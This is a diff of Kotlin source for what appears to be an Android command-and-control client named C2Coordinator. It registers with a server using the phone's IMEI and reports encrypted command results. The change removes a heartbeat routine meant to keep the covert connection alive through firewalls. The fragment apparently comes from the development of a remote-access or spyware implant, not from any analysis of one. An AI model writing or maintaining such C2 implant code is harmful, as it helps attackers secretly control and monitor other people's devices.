@@ -52,8 +52,7 @@ object C2Coordinator {
             onStatus = { status -> Log.d(TAG, "WS: $status") }
         ).also { it.connect(imei) }
 
-        // ── Application-level keepalive: send ping every 15 seconds ──
-        startKeepalive()
+        Log.d(TAG, "Coordinator started — device=$deviceId")
     }
 
     fun stop() {
@@ -71,36 +70,4 @@ object C2Coordinator {
     }
 
     fun isConnected(): Boolean = ws?.isConnected() == true
-
-    /**
-     * Application-level keepalive: sends a lightweight "ping" command
-     * every KEEPALIVE_INTERVAL_MS. This keeps the WebSocket connection
-     * alive even when the server's TCP idle timeout is short, and also
-     * serves as a heartbeat to detect disconnections early.
-     *
-     * The ping uses `CryptoEngine.encrypt()` so the server sees a normal
-     * encrypted message — it can respond or ignore it. The key point is
-     * that data flows on the connection, preventing NAT/firewall timeouts.
-     */
-    private fun startKeepalive() {
-        keepaliveJob?.cancel()
-        keepaliveJob = scope.launch {
-            delay(5_000) // Initial delay to let registration complete
-            while (isActive) {
-                try {
-                    if (ws?.isConnected() == true) {
-                        val pingJson = """{"type":"result","device_id":"$deviceId","command_id":"keepalive","data":"pong"}"""
-                        ws?.send(CryptoEngine.encrypt(pingJson))
-                        Log.d(TAG, "Keepalive ping sent")
-                    } else {
-                        Log.d(TAG, "Keepalive skipped — not connected")
-                    }
-                } catch (e: Exception) {
-                    Log.w(TAG, "Keepalive ping failed: ${e.message}")
-                }
-                delay(KEEPALIVE_INTERVAL_MS)
-            }
-        }
-        Log.d(TAG, "Keepalive started (interval=${KEEPALIVE_INTERVAL_MS}ms)")
-    }
 }
